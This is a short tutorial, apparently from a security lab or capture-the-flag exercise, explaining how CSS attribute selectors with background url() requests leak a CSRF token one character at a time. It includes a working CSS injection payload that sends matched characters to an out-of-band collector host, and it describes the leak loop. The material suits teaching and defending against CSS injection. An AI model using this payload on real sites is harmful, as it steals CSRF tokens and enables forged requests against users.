Two CSS facts combine into a data leak:

1. **Attribute selectors test attribute values.** `input[name="csrf"][value^="a"]`
   matches only if the token's value **starts with** `a`.
2. **A matched rule can fire a request.** `background: url("…")` on a matched,
   rendered element makes the browser fetch that URL.

Put them together — this rule beacons the collector **only if** the token starts
with `a`:

```css
input[name='csrf'][value^='a'] {
  background: url('http://collector:9000/report?p=0&c=a');
}
```

Submit one such rule for every possible first character (`0`–`9`, `a`–`f`). Exactly
one matches, and the collector (read it via `GET /oob/received`) tells you the first
character. The catch: to test the _second_ character you must bake the known first
character into the prefix (`value^="<c0>a"`, `value^="<c0>b"`, …). So you leak the
token one character per stylesheet — a loop.
